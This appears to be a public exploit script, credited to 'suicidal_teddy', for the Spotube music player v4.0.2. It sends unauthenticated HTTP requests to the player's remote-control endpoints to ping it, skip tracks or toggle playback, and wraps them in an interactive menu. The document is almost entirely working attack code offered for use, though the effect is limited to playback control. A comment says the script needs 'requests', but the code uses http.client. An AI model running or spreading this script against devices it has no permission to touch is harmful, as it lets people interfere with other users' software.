#!/usr/bin/env python3
import http.client
# Exploit Title: Remote manipulate
# Exploit Author: suicidal_teddy
# Date:24 april 2025
# Vendor Homepage: https://github.com/KRTirtho/spotube
# Version:v4.0.2
# Tested on: on kali linux

#x.com/ayuumimainuwu
#http://mastodon.social/@suicidal_teddy
#http://youtube.com/@suicidalteddy
#https://discord.gg/gtn7cMrJmd
# my first zero day allows any user to Remote manipulate music player
# requires pip install requests

# Custom headers to emulate BurpSuite-style browser requests
import http.client
BROWSER_HEADERS = {
    "Accept-Language": "en-US,en;q=0.9",
    "Upgrade-Insecure-Requests": "1",
    "User-Agent": "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 "
                  "(KHTML, like Gecko) Chrome/135.0.0.0 Safari/537.36",
    "Accept": ("text/html,application/xhtml+xml,application/xml;q=0.9,"
               "image/avif,image/webp,image/apng,*/*;q=0.8,"
               "application/signed-exchange;v=b3;q=0.7"),
    "Accept-Encoding": "gzip, deflate, br",
    "Connection": "keep-alive",
}

def cmd(host: str, port: str, path: str):
    try:
        conn = http.client.HTTPConnection(host, int(port), timeout=5)
        conn.putrequest("GET", path)
        conn.putheader("Host", f"{host}:{port}")
        for header, value in BROWSER_HEADERS.items():
            conn.putheader(header, value)
        conn.endheaders()

        response = conn.getresponse()
        body = response.read().decode(errors="replace")

        print(f"{path} → {response.status} {response.reason}")
        print(body.strip())

    except Exception as e:
        print(f"Error calling {path}: {e}")
    finally:
        conn.close()

def main():
    print("⚙️  Spotube Remote Control CLI (HTTP only)\n")
    host = input("Enter Spotube host [192.168.21.76]: ").strip() or "192.168.21.76"
    port = input("Enter port [17086]: ").strip() or "17086"

    actions = {
        '1': ("Ping server",        "/ping"),
        '2': ("Next track",         "/playback/next"),
        '3': ("Previous track",     "/playback/previous"),
        '4': ("Toggle play/pause",  "/playback/toggle-playback"),
        '5': ("Exit",               None),
    }

    while True:
        print("\n=== Menu ===")
        for key in sorted(actions.keys(), key=int):
            label, _ = actions[key]
            print(f"{key}. {label}")
        choice = input("Choose an option: ").strip()

        if choice not in actions:
            print("❌  Invalid choice, try again.")
            continue

        label, path = actions[choice]
        if choice == '5':
            print("👋  Goodbye!")
            break

        print(f"\n▶️  {label} …")
        cmd(host, port, path)

if __name__ == "__main__":
    main()
